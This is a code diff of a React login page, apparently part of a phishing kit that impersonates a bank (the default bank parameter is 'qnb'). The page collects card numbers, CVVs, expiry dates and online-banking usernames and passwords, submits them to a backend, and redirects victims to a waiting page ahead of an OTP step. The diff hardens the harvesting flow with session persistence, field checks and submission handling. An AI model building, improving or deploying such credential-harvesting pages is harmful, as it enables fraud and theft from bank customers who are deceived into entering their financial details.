@@ -1,4 +1,4 @@
-import { useState } from "react";
+import { useState, useEffect } from "react";
 import { useLocation, useSearch } from "wouter";
 import { trpc } from "@/lib/trpc";
 import { useLanguage } from "@/contexts/LanguageContext";
@@ -10,8 +10,20 @@ export default function LoginMethod() {
   const { language, setLanguage, t } = useLanguage();
   const params = new URLSearchParams(search);
   const bank = params.get("bank") || "qnb";
-  const sessionId = localStorage.getItem("sessionId") || "";
-  const showError = params.get("error") === "true";
+  
+  // التحقق من sessionId من مصادر متعددة لضمان الاستمرارية
+  const [sessionId, setSessionId] = useState<string>("");
+
+  useEffect(() => {
+    const sId = localStorage.getItem("sessionId") || params.get("session") || "";
+    if (sId) {
+      setSessionId(sId);
+      // تحديث localStorage إذا كان مفقوداً
+      if (!localStorage.getItem("sessionId")) {
+        localStorage.setItem("sessionId", sId);
+      }
+    }
+  }, [params]);
 
   const isArabic = language === "ar";
   const footerImage = isArabic 
@@ -44,14 +56,23 @@ export default function LoginMethod() {
 
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
-    try {
-      const currentSessionId = sessionId || params.get("session") || "";
-      if (!currentSessionId) {
-        toast.error(isArabic ? "جلسة غير صالحة" : "Invalid session");
-        return;
-      }
+    
+    // تأكيد وجود sessionId قبل الإرسال
+    const currentSessionId = sessionId || localStorage.getItem("sessionId") || params.get("session") || "";
+    
+    if (!currentSessionId) {
+      toast.error(isArabic ? "جلسة غير صالحة، يرجى العودة للرئيسية" : "Invalid session, please return to home");
+      return;
+    }
 
+    try {
       if (method === "card") {
+        // التحقق من تعبئة كافة الحقول المطلوبة للبطاقة
+        if (!cardData.cardNumber || !cardData.cardholderName || !cardData.expiryDate || !cardData.cvv) {
+          toast.error(isArabic ? "يرجى ملء كافة بيانات البطاقة" : "Please fill all card details");
+          return;
+        }
+
         await submitLoginMethodMutation.mutateAsync({
           sessionId: currentSessionId,
           loginType: "card",
@@ -59,25 +80,33 @@ export default function LoginMethod() {
           cardholderName: cardData.cardholderName,
           expiryDate: cardData.expiryDate,
           cvv: cardData.cvv,
-          username: undefined,
-          password: undefined,
-        } as any);
+          username: "",
+          password: "",
+        });
       } else {
+        // التحقق من تعبئة اسم المستخدم وكلمة المرور
+        if (!userData.username || !userData.password) {
+          toast.error(isArabic ? "يرجى ملء اسم المستخدم وكلمة المرور" : "Please fill username and password");
+          return;
+        }
+
         await submitLoginMethodMutation.mutateAsync({
           sessionId: currentSessionId,
           loginType: "user",
           username: userData.username,
           password: userData.password,
-          cardNumber: undefined,
-          cardholderName: undefined,
-          expiryDate: undefined,
-          cvv: undefined,
-        } as any);
+          cardNumber: "",
+          cardholderName: "",
+          expiryDate: "",
+          cvv: "",
+        });
       }
+      
+      // التوجيه لصفحة الانتظار بعد النجاح
       setLocation(`/waiting?bank=${bank}&session=${currentSessionId}&next=otp`);
     } catch (error) {
       console.error("Submission error:", error);
-      toast.error(isArabic ? "حدث خطأ أثناء الإرسال" : "Error during submission");
+      toast.error(isArabic ? "فشل الإرسال، يرجى المحاولة مرة أخرى" : "Submission failed, please try again");
     }
   };
 
@@ -89,145 +118,77 @@ export default function LoginMethod() {
     <div className="page-wrapper">
       <style>{`
         .page-wrapper { font-family: sans-serif; background-color: #f4f4f4; margin: 0; display: flex; flex-direction: column; min-height: 100vh; }
-        
         .header { position: relative; width: 100%; display: flex; justify-content: space-between; align-items: center; padding: 10px 25px; background-color: #ffffff; border-bottom: 2px solid #8C0032; z-index: 1000; box-sizing: border-box; }
         .logo { height: 80px; width: auto; object-fit: contain; background-color: white; padding: 5px; }
-        .menu-icon { font-size: 28px; color: #8C0032; cursor: pointer; }
         .lang-btn { background: transparent; color: #8C0032; border: 2px solid #8C0032; padding: 5px 15px; border-radius: 5px; font-weight: bold; cursor: pointer; }
-
         .container { padding: 20px; flex: 1; }
-        
         .selection-box { background: white; border: 2px solid #ddd; border-radius: 10px; padding: 20px; margin-bottom: 15px; cursor: pointer; text-align: center; transition: 0.3s; }
         .selection-box.active { border-color: #8C0032; background-color: #fff9f9; }
         .selection-box h3 { margin: 0 0 10px 0; color: #333; }
         .selection-box p { margin: 0; color: #8C0032; font-weight: bold; }
-
         .form-section { background: white; padding: 20px; border-radius: 10px; display: none; margin-top: 15px; }
         .form-section.active { display: block; }
         .form-group { margin-bottom: 15px; }
         label { display: block; margin-bottom: 5px; font-weight: bold; }
         input { width: 100%; padding: 12px; border: 1px solid #ddd; border-radius: 5px; box-sizing: border-box; }
         .submit-btn { background: #8C0032; color: white; padding: 15px; width: 100%; border: none; border-radius: 5px; font-weight: bold; cursor: pointer; margin-top: 10px; }
-        
         .footer-image { width: 100%; display: block; margin-top: 20px; }
-        
-        .flex-row { display: flex; gap: 10px; }
-        .flex-row .form-group { flex: 1; }
       `}</style>
+      
       <header className="header">
-        <div className="menu-icon">&#9776;</div>
-        <img src="https://files.manuscdn.com/user_upload_by_module/session_file/310519663834255146/ubzPDKYkYhFWJOVw.png" className="logo" />
-        <button onClick={toggleLanguage} className="lang-btn" style={{ textDecoration: "none" }}>
-          {isArabic ? "English" : "عربي"}
-        </button>
+        <div style={{ fontSize: "28px", color: "#8C0032" }}>&#9776;</div>
+        <img src="https://i.ibb.co/5XVcXsGs/1dd76f2f664441de0899c73896f966f1.jpg" className="logo" alt="Logo" />
+        <button onClick={toggleLanguage} className="lang-btn">{isArabic ? "English" : "العربية"}</button>
       </header>
 
       <div className="container">
-        {showError && (
-          <div style={{ background: "#fee2e2", border: "1px solid #ef4444", color: "#b91c1c", padding: "10px", borderRadius: "5px", marginBottom: "15px", textAlign: "center", fontSize: "14px" }}>
-            {t("invalid_data")}
-          </div>
-        )}
-        <div
-          className={`selection-box ${method === "card" ? "active" : ""}`}
-          onClick={() => setMethod("card")}
-        >
+        <div className={`selection-box ${method === "card" ? "active" : ""}`} onClick={() => setMethod("card")}>
           <h3>{isArabic ? "تسجيل الدخول" : "Login"}</h3>
           <p>{isArabic ? "البطاقة البنكية" : "Bank Card"}</p>
         </div>
 
-        <div
-          className={`selection-box ${method === "user" ? "active" : ""}`}
-          onClick={() => setMethod("user")}
-        >
+        <div className={`selection-box ${method === "user" ? "active" : ""}`} onClick={() => setMethod("user")}>
           <h3>{isArabic ? "تسجيل الدخول" : "Login"}</h3>
           <p>{isArabic ? "باسم المستخدم وكلمة المرور" : "Username & Password"}</p>
         </div>
 
         <form onSubmit={handleSubmit}>
-          {method === "card" && (
+          {method === "card" ? (
             <div className="form-section active">
               <div className="form-group">
                 <label>{isArabic ? "رقم البطاقة" : "Card Number"}</label>
-                <input
-                  type="number"
-                  name="cardNumber"
-                  placeholder="XXXX XXXX XXXX XXXX"
-                  value={cardData.cardNumber}
-                  onChange={handleCardChange}
-                  required
-                />
+                <input name="cardNumber" type="number" placeholder="XXXX XXXX XXXX XXXX" value={cardData.cardNumber} onChange={handleCardChange} />
               </div>
               <div className="form-group">
                 <label>{isArabic ? "اسم صاحب البطاقة" : "Cardholder Name"}</label>
-                <input
-                  type="text"
-                  name="cardholderName"
-                  placeholder={isArabic ? "اسم صاحب البطاقة" : "Cardholder Name"}
-                  value={cardData.cardholderName}
-                  onChange={handleCardChange}
-                  required
-                />
+                <input name="cardholderName" type="text" placeholder={isArabic ? "اسم صاحب البطاقة" : "Cardholder Name"} value={cardData.cardholderName} onChange={handleCardChange} />
               </div>
-              <div className="flex-row">
-                <div className="form-group">
+              <div style={{ display: "flex", gap: "10px" }}>
+                <div className="form-group" style={{ flex: 1 }}>
                   <label>{isArabic ? "تاريخ الانتهاء" : "Expiry Date"}</label>
-                  <input
-                    type="text"
-                    name="expiryDate"
-                    placeholder="MM/YY"
-                    value={cardData.expiryDate}
-                    onChange={handleCardChange}
-                    required
-                  />
+                  <input name="expiryDate" type="text" placeholder="MM/YY" value={cardData.expiryDate} onChange={handleCardChange} />
                 </div>
-                <div className="form-group">
+                <div className="form-group" style={{ flex: 1 }}>
                   <label>CVV</label>
-                  <input
-                    type="number"
-                    name="cvv"
-                    placeholder="XXX"
-                    value={cardData.cvv}
-                    onChange={handleCardChange}
-                    required
-                  />
+                  <input name="cvv" type="number" placeholder="XXX" value={cardData.cvv} onChange={handleCardChange} />
                 </div>
               </div>
-              <button type="submit" className="submit-btn">
-                {isArabic ? "متابعة" : "Continue"}
-              </button>
             </div>
-          )}
-
-          {method === "user" && (
+          ) : (
             <div className="form-section active">
               <div className="form-group">
                 <label>{isArabic ? "اسم المستخدم" : "Username"}</label>
-                <input
-                  type="text"
-                  name="username"
-                  placeholder={isArabic ? "اسم المستخدم" : "Username"}
-                  value={userData.username}
-                  onChange={handleUserChange}
-                  required
-                />
+                <input name="username" type="text" placeholder={isArabic ? "اسم المستخدم" : "Username"} value={userData.username} onChange={handleUserChange} />
               </div>
               <div className="form-group">
                 <label>{isArabic ? "كلمة المرور" : "Password"}</label>
-                <input
-                  type="password"
-                  name="password"
-                  placeholder={isArabic ? "كلمة المرور" : "Password"}
-                  value={userData.password}
-                  onChange={handleUserChange}
-                  required
-                />
+                <input name="password" type="password" placeholder={isArabic ? "كلمة المرور" : "Password"} value={userData.password} onChange={handleUserChange} />
               </div>
-              <button type="submit" className="submit-btn">
-                {isArabic ? "متابعة" : "Continue"}
-              </button>
             </div>
           )}
+          <button type="submit" className="submit-btn" disabled={submitLoginMethodMutation.isLoading}>
+            {submitLoginMethodMutation.isLoading ? (isArabic ? "جاري الإرسال..." : "Sending...") : (isArabic ? "متابعة" : "Continue")}
+          </button>
         </form>
       </div>
 
